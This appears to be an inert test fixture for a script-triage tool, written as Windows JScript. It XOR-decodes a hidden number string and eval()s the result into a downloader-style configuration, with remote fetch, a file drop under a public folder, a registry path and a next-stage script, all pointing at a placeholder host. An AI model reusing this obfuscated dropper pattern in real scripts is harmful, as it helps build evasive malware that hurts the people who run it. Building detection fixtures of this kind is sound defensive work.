// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_fe8de941 = function decode_fe8de941_body(storedMaterial) {
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push(storedMaterial[i] ^ 138); }
  return recoveredMaterial;
};
var recover_73451862 = function recover_73451862_body() {
  // configuration reconstruction
  var packedText = "241-168-249-254-239-250-249-168-176-209-168-235-233-251-255-227-248-239-213-248-239-231-229-254-239-168-166-168-253-248-227-254-239-213-236-227-230-239-168-166-168-238-227-249-250-235-254-233-226-213-250-248-229-233-239-249-249-168-166-168-226-235-228-238-229-236-236-213-249-233-248-227-250-254-168-215-166-168-235-238-235-250-254-239-248-168-176-168-199-217-210-199-198-184-164-210-199-198-194-222-222-218-164-188-164-186-168-166-168-252-235-230-255-239-249-168-176-241-168-233-235-231-250-235-227-237-228-213-227-238-168-176-168-233-235-231-250-235-227-237-228-167-188-232-191-235-184-238-232-236-179-185-168-166-168-255-248-230-168-176-168-226-254-254-250-249-176-165-165-188-232-191-235-184-238-232-236-179-185-164-239-242-235-231-250-230-239-164-227-228-252-235-230-227-238-165-187-191-189-239-179-189-179-191-164-238-235-254-168-166-168-255-249-239-248-213-235-237-239-228-254-168-176-168-194-255-228-254-248-239-249-249-198-235-232-165-188-232-191-235-184-238-232-236-179-185-168-166-168-236-227-230-239-213-250-235-254-226-168-176-168-201-176-214-214-223-249-239-248-249-214-214-218-255-232-230-227-233-214-214-194-255-228-254-248-239-249-249-198-235-232-214-214-249-254-235-237-239-167-188-232-191-235-184-238-232-236-179-185-164-238-235-254-168-166-168-248-239-237-227-249-254-248-243-213-250-235-254-226-168-176-168-194-193-201-223-214-214-217-229-236-254-253-235-248-239-214-214-194-255-228-254-248-239-249-249-198-235-232-214-214-206-227-249-250-229-249-235-232-230-239-214-214-188-232-191-235-184-238-232-236-179-185-168-166-168-228-239-242-254-213-249-254-235-237-239-168-176-168-230-229-233-235-230-167-238-227-249-250-235-254-233-226-164-224-249-168-247-166-168-249-254-235-237-239-201-229-255-228-254-168-176-190-247";
  var packedParts = packedText.split("-");
  var storedMaterial = [];
  for (var di = 0; di < packedParts.length; di++) { storedMaterial.push(parseInt(packedParts[di], 10)); }
  var harmlessValue = (2 > 1) ? "left" : "right";
  var invoke = function(block, value) { return block.call(null, value); };
  var recoveredMaterial = invoke.call(null, decode_fe8de941, storedMaterial);
  var textParts = [], bi = 0;
  for (bi = 0; bi < recoveredMaterial.length; bi++) { textParts.push(String.fromCharCode(recoveredMaterial[bi])); }
  var configurationText = textParts.join("");
  return configurationText;
  // end reconstruction
};
var inspect_8b8626a4 = function inspect_8b8626a4_body() {
  var configuration = eval("(" + recover_73451862.call(null) + ")");
  var analysisPlan = new Object();
  analysisPlan["steps"] = configuration["steps"];
  analysisPlan["adapter"] = configuration["adapter"];
  analysisPlan["values"] = configuration["values"];
  analysisPlan["stageCount"] = configuration["stageCount"];
  return analysisPlan;
};
